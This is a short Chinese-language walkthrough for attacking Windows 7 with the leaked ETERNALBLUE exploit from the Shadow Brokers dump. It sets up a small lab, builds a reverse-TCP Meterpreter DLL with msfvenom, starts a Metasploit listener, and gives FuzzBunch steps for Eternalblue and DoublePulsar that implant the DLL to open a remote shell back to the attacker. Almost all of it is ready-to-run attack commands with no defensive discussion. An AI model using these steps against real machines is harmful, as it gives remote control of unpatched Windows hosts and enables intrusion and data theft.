# 0day
方程式 0day ETERNALBLUE
方程式 0day ETERNALBLUE 
环境部署
攻击环境:32位系统[win7 2003均可]&Kali系统
靶机环境:win7 x86
安装程序: pywin32-221.win32-py2.6与python-2.6.6[均已打包]
已经今天的主角影子经纪人公布的方程式0day ETERNALBLUE
号称入侵一切Windows主机[深切会到帝国主义的强大]
 下载地址:https://github.com/misterch0c/shadowbroker
环境介绍
攻击者win2003: 192.168.220.128
攻击者Kali：192.168.220.129
受害者win7: 192.168.220.132
攻击环节
进入Kali
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=5555 -f dll > s.dll
msfconsole 启动msf命令
msf > use exploit/multi/handler
msf > set LHOST IP
msf > set LPORT 5555
msf > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf > exploit  #开启监听后我们开始攻击配置
进入Win2003
解压shadowbroker进入windows目录，新建listeningposts目录。#这里我就不演示了
运行fb.py，创建一个攻击项目:
TargetIP输入受害者IP
CallbackIP输入攻击者IP
使用重定向 no
输入use Eternalblue
选择目标系统是根据实际情况选择
选择传输装置是选择FB
输入use Doublepulsar
目标系统:根据系统选择
种植后门:选择RunDLL
讲MSF生成的DLL木马位置写入进去
成功
